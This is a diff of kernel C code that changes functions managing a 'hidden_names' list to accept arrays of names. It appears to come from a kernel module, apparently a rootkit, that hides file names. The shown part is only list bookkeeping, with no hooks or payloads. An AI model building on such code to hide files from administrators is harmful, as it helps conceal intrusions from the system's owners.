@@ -151,25 +151,28 @@ void fs_list_names(void) {
     }
 }
 
-static int _fs_add_name(const char *name, bool ro) {
-    size_t len;
-    if (!name || *name == '\0')
+static int _fs_add_name(const char *names[], bool ro) {
+    const char **s;
+
+    if (!names)
         goto err;
 
-    len = strlen(name);
-    if (!len)
-        goto err;
+    for (s = names; *s != NULL; ++s) {
+        size_t len = strlen(*s);
+        if (!len)
+            continue;
 
-    if (!fs_search_name(name)) {
-        struct hidden_names *hn = kcalloc(1, sizeof(struct hidden_names) , GFP_KERNEL);
-        if (!hn)
-            return -ENOMEM;
+        if (!fs_search_name(*s)) {
+            struct hidden_names *hn = kcalloc(1, sizeof(struct hidden_names) , GFP_KERNEL);
+            if (!hn)
+                return -ENOMEM;
 
-        prinfo("addname '%s' ro=%d\n", name, ro);
-        hn->name = kcalloc(1, strlen(name)+1, GFP_KERNEL);
-        strncpy(hn->name, (const char*)name, len);
-        hn->ro = ro;
-        list_add_tail(&hn->list, &names_node);
+            prinfo("addname '%s' ro=%d\n", *s, ro);
+            hn->name = kcalloc(1, len+1, GFP_KERNEL);
+            strncpy(hn->name, (const char*)*s, len);
+            hn->ro = ro;
+            list_add_tail(&hn->list, &names_node);
+        }
     }
     return 0;
 err:
@@ -177,32 +180,37 @@ err:
     return -EINVAL;
 }
 
-int fs_add_name_ro(const char *name) {
-    return _fs_add_name(name, true);
+int fs_add_name_ro(const char *names[]) {
+    return _fs_add_name(names, true);
 }
 
-int fs_add_name_rw(const char *name) {
-    return _fs_add_name(name, false);
+int fs_add_name_rw(const char *names[]) {
+    return _fs_add_name(names, false);
 }
 
-bool fs_del_name(const char *name) {
-    struct hidden_names *node, *node_safe;
-    if (!name)
-        return false;
+bool fs_del_name(const char *names[]) {
+    int deleted = 0;
 
-    list_for_each_entry_safe(node, node_safe, &names_node, list) {
-        if (node->ro) continue;
-        if (!strcmp(node->name, name)) {
-            prinfo("delname '%s'\n", name);
-            list_del(&node->list);
-            if (node->name)
-                kfree(node->name);
-            kfree(node);
-            node = NULL;
-            return true;
+    if (names) {
+        struct hidden_names *node, *node_safe;
+        const char **s;
+        for (s = names; *s != NULL; ++s) {
+            list_for_each_entry_safe(node, node_safe, &names_node, list) {
+                if (node->ro) continue;
+                if (!strcmp(node->name, *s)) {
+                    prinfo("delname '%s'\n", *s);
+                    list_del(&node->list);
+                    if (node->name)
+                        kfree(node->name);
+                    kfree(node);
+                    node = NULL;
+                    ++deleted;
+                }
+            }
         }
     }
-    return false;
+
+    return (deleted ? true : false);
 }
 
 void fs_names_cleanup(void) {
